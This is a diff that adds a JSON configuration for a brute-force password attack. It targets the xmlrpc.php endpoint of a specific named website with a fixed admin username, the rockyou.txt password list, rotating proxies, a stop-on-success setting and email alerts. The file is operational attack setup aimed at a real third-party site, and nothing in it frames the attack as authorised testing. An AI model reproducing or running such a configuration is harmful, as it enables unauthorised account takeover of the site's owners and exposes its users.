@@ -1,0 +1,19 @@
+{
+    "url": "https://stpaulsayanagar.com/xmlrpc.php",
+    "proxy_file": "/home/cynide/Desktop/Web/proxies.txt",
+    "password_file": "/home/cynide/Documents/rockyou.txt",
+    "username_mode": "constant",
+    "constant_username": "spsadmin",
+    "username_file": "path/to/usernames.txt",
+    "log_level": "INFO",
+    "log_file": "brute_force.log",
+    "stop_on_success": true,
+    "delay": 1,
+    "email_config": {
+        "from": "your_email@example.com",
+        "to": "notify@example.com",
+        "smtp_server": "smtp.example.com",
+        "smtp_port": 587,
+        "password": "your_email_password"
+    }
+}
